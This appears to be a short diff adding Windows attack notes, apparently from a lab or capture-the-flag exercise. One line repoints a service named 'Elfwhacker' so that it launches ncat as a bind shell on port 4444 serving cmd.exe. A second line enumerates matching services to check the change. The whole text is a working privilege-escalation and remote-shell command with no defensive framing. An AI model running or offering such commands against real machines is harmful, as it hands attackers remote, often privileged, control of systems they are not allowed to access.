@@ -1,0 +1,3 @@
+sc config Elfwhacker binpath= "C:\ncat.exe -nvlp 4444 -e C:\WINDOWS\System32\cmd.exe"
+
+Get-WmiObject win32_service | ?{$_.Name -like '*Elf*'} | select Name, DisplayName, State, PathName
